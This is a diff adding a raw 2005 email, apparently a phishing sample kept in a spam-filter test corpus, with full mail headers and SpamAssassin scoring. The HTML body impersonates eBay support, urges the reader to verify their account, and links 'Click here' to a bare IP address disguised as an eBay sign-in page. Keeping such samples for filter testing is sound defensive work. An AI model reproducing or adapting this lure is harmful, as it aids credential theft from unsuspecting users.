@@ -1,0 +1,76 @@
+From nobody Sun Jan 25 13:48:11 2015
+Return-Path: <chairmanmc@vuatkerala.org>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id BAEE253709B
+ for <nobody@login.example.com>; Sat,  3 Dec 2005 17:25:16 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+ by mail2.example.com (Postfix) with ESMTP id 616A66FA2B9
+ for <nobody@example.com>; Sat,  3 Dec 2005 17:25:13 -0500 (EST)
+Received: from lujan.example.com (foo.example.com [10.2.3.4])
+ by mail2.example.com (Postfix) with ESMTP
+ for <nobody@example.com>; Sat,  3 Dec 2005 17:25:13 -0500 (EST)
+Received: by lujan.example.com (Postfix)
+ id E79921BC43; Sat,  3 Dec 2005 23:25:17 +0100 (CET)
+Delivered-To: foobee@example.com
+Received: from localhost (unknown [127.0.0.1])
+ by lujan.example.com (Postfix) with ESMTP id 74F141BB58
+ for <foobee@example.com>; Sat,  3 Dec 2005 22:25:17 +0000 (UTC)
+Received: from lujan.example.com ([10.2.3.4])
+ by localhost (lujan [10.2.3.4]) (amavisd-new, port 10024)
+ with ESMTP id 25954-03 for <foobee@example.com>;
+ Sat, 3 Dec 2005 23:25:06 +0100 (CET)
+Received: from vuatkerala.org (unknown [202.88.239.219])
+ by lujan.example.com (Postfix) with ESMTP id 3ADD91BB16
+ for <foobee@example.com>; Sat,  3 Dec 2005 23:24:59 +0100 (CET)
+Received: from vuatkerala.org (localhost.localdomain [127.0.0.1])
+ by vuatkerala.org (8.13.1/8.13.1) with ESMTP id jB3MUwMR012130
+ for <foobee@example.com>; Sun, 4 Dec 2005 04:00:58 +0530
+Received: (from chairmanmc@localhost)
+ by vuatkerala.org (8.13.1/8.13.1/Submit) id jB3MUvOK012128
+ for foobee@example.com; Sun, 4 Dec 2005 04:00:57 +0530
+Date: Sun, 4 Dec 2005 04:00:57 +0530
+To: foobee@example.com
+Subject: FPO Notice: Important information about your eBay account
+Message-ID: <1133649057.21265.qmail@arribada.ebay.com>
+From: "eBay Customer Support" <customer@ebay.com>
+Content-type: text/html
+X-Virus-Scanned: by amavisd-new-20030616-p10 (Debian) at example.com
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: *
+X-Spam-Status: No, score=1.1 required=5.0 tests=HTML_IMAGE_ONLY_24,
+ HTML_MESSAGE,HTML_MIME_NO_HTML_TAG,HTML_TAG_EXIST_TBODY,
+ MIME_HEADER_CTYPE_ONLY,MIME_HTML_ONLY,NORMAL_HTTP_TO_IP autolearn=no 
+ version=3.0.2
+X-Spam-Report: * 0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address
+ in URL
+ *  0.5 HTML_IMAGE_ONLY_24 BODY: HTML: images with 2000-2400 bytes of words
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 HTML_TAG_EXIST_TBODY BODY: HTML has "tbody" tag
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ * 0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME
+ headers
+ *  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 75
+
+<BR>&nbsp; 
+<P align=left><IMG height=70 src="http://pics.ebaystatic.com/aw/pics/navbar/redesign_p1/ebayLogo.gif" width=150 border=0><B><FONT style="LINE-HEIGHT: 1.35em" face="Arial, Helvetica, sans-serif" size=2>Update Your Account Information</FONT></B></P>
+<TABLE height=87 cellSpacing=0 cellPadding=0 width=742 border=0>
+<TBODY>
+<TR>
+<TD style="FONT-SIZE: x-small; FONT-FAMILY: arial,helvetica,sans-serif" width=742 height=1><IMG height=10 alt=spacer src="http://pics.ebay.com/aw/pics/spacer.gif" width=1></TD></TR>
+<TR>
+<TD style="FONT-SIZE: x-small; FONT-FAMILY: arial,helvetica,sans-serif" vAlign=top width=742 height=118><FONT style="LINE-HEIGHT: 1.35em" face=Verdana size=2>
+<P>According to our site policy you will have to confirm that you are the real owner of the eBay account by completing the following form.</P>
+<P><FONT style="LINE-HEIGHT: 1.35em" color=#ff0000><B>Never share your eBay password to anyone! </B></FONT></P>
+<P><FONT style="LINE-HEIGHT: 1.35em" size=2>Establish your proof of identity with ID Verify (free of charge) - an easy way to help others trust you as their trading partner. The process takes about 5 minutes to complete and involves updating your eBay information. When you're successfully verified, you will receive an ID Verify icon <IMG height=16 alt="ID Verify icon" src="http://pics.ebaystatic.com/aw/pics/verify-icon.gif" width=16 align=absMiddle border=0> in your feedback profile. </FONT></P>
+<DIV>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+<TBODY>
+<TR>
+<TD style="FONT-SIZE: x-small; FONT-FAMILY: arial,helvetica,sans-serif"><IMG height=40 alt="eBay logo" hspace=0 src="http://pics.ebay.com/aw/pics/register/HeaderRegister_387x40.gif" width=387 border=0> 
+<P><SPAN style="FONT-FAMILY: Arial"><FONT size=2>To update your eBay records </FONT></SPAN><FONT size=2><A onclick="return top.js.OpenExtLink(window,event,this)" href="http://216.77.101.3/.signin.ebay.com/ws/eBayISAPIdllSignIn.php" target=_blank><SPAN style="COLOR: red; FONT-FAMILY: Arial">Click here</SPAN></A></FONT></P></TD></TR></TBODY></TABLE></DIV></FONT></TD></TR></TBODY></TABLE>
